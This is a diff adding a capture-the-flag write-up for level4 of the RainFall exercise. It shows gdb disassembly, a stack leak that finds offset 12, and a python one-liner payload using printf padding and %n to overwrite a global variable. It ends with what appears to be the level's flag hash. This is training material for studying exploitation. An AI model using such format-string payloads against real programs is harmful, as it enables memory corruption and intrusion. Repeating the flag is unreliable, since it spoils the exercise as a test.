@@ -54,4 +54,71 @@ End of assembler dump.
 
 ```
 
-in
+**p function**
+
+```c
+(gdb) disass p
+Dump of assembler code for function p:
+   0x08048444 <+0>:     push   ebp
+   0x08048445 <+1>:     mov    ebp,esp
+   0x08048447 <+3>:     sub    esp,0x18
+   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]
+   0x0804844d <+9>:     mov    DWORD PTR [esp],eax
+   0x08048450 <+12>:    call   0x8048340 <printf@plt>
+   0x08048455 <+17>:    leave
+   0x08048456 <+18>:    ret
+End of assembler dump.
+```
+
+as the previous level we need to change 0x8049810 to be equal 0x1025544.
+
+```c
+level4@RainFall:~$ ./level4
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
+level4@RainFall:~$
+```
+
+we have a foramt string vulnerability the offset is 12 so we change this 0x8049810 content by %n so we use this scrript.
+
+```c
+Breakpoint 1 at 0x8048492
+(gdb) r < a
+Starting program: /home/user/level4/level4 < a
+�b7ff26b0bffff764b7fd0ff400bffff728804848dbffff520200b7fd1ac0b7ff37d0
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) x/x 0x08048492
+0x8048492 <n+59>:       0x0255443d
+(gdb) x/x 0x8049810
+0x8049810 <m>:  0x00000048
+(gdb) p 0x8049810
+$1 = 134518800
+(gdb) p *0x8049810
+$2 = 72
+(gdb)
+```
+
+0x1025544 = 16930116 - 72 = 16,930,044 we need to add 16,930,044 characters.
+
+```c
+level4@RainFall:~$ cat a -| ./level4
+�b7ff26b0bffff794b7fd0ff400bffff758804848dbffff550200b7fd1ac0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalevel4@RainFall:~$
+```
+
+we cant pass this huge number to fgets so we use printf's padding.
+
+```python
+level4@RainFall:~$ python -c 'print("\x08\x04\x98\x10"[::-1] + "%x" * 10 + "%16930052x" + "%n")' > a
+```
+
+```
+(gdb) info register
+eax            0x1025544        16930116
+```
+
+taraaaaaaaaaaaaaaaaaaaaaaaaaaa:
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+ <!-- visca barca -->
